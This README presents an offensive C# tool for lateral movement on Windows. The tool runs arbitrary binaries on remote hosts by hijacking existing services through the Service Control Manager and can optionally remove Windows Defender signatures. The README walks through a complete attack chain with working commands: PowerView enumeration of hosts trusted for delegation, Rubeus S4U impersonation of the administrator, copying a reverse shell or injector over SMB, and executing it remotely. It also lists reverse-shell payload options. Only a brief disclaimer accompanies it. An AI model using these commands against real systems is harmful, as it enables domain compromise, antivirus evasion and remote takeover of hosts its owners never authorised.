# FilelessLateralMovement

FilelessLateralMovement is a C# tool designed to execute arbitrary binaries on remote Windows hosts by abusing the Service Control Manager (SCM) and existing services. It supports an optional Defender bypass step and is particularly useful in post-exploitation scenarios, such as after exploiting Kerberos Constrained Delegation (KCD).

## 🚀 Features

- Remote execution via SCM  
- Optional Windows Defender signature removal  
- Restores original service configuration after execution  
- Compatible with Kerberos Constrained Delegation (`S4U2Self` + `S4U2Proxy`)  
- Written in pure C#, no PowerShell required

## 💥 Usage

```
FilelessLateralMovement.exe [TargetHost] [ServiceName] [BinaryToRun] [--skip-defender (optional)]
```

### 🔧 Arguments

| Argument         | Description                                          |
|------------------|-----------------------------------------------------|
| TargetHost      | Hostname or IP address of the remote system         |
| ServiceName     | Short name of the target service (not display name) |
| BinaryToRun     | Full path or command to execute on the remote system |
| --skip-defender | *(Optional)* Skip Windows Defender bypass step      |

### ⚡ Examples

**With Defender bypass**
```
FilelessLateralMovement.exe appsrv01 SensorService "C:\Windows\Temp\payload.exe"
```

**Without Defender bypass**
```
FilelessLateralMovement.exe appsrv01 SensorService "C:\Windows\Temp\payload.exe" --skip-defender
```

## 🔥 Example Attack Chain (Constrained Delegation Exploitation)

### 🕵️ Step 1: Identify vulnerable computers

Look for machines/accounts with the `TRUSTED_TO_AUTH_FOR_DELEGATION` flag using PowerView:
```
Get-DomainComputer -TrustedToAuth
```

Example output:
```
CN=WEB01,OU=EvilServers,OU=EvilComputers,DC=evil,DC=com
msds-allowedtodelegateto : {cifs/file01.evil.com, cifs/FILE01}
serviceprincipalname : {WSMAN/web01, TERMSRV/WEB01, ...}
useraccountcontrol : WORKSTATION_TRUST_ACCOUNT, TRUSTED_TO_AUTH_FOR_DELEGATION
```

---

### 🎭 Step 2: Abuse constrained delegation with Rubeus

```
Rubeus.exe s4u /user:WEB01$ /rc4:<HASH> /impersonateuser:administrator /msdsspn:cifs/file01.evil.com /ptt
```

---

### 💣 Step 3: Check access & upload payload

Check that the ticket works:
```
ls \\file01\c$
```

Upload the reverse shell or injector binary:
```
copy C:\Temp\inject.exe \\file01\c$\Windows\Temp\
```

---

### ⚔️ Step 4: Execute payload remotely

Run the payload on the target:
```
FilelessLateralMovement.exe file01.evil.com SensorService "C:\Windows\Temp\inject.exe"
```

---

## ✅ Summary of payload types

- Reverse shells (e.g., msfvenom, nc64.exe, custom revshells)  
- Process injection binaries you developed  
- LOLBins (e.g., `cmd.exe /c whoami`)

---

## ⚠️ Disclaimer

This tool is intended **for educational and authorized security testing purposes only**. Do not use it against systems you do not have explicit permission to test.

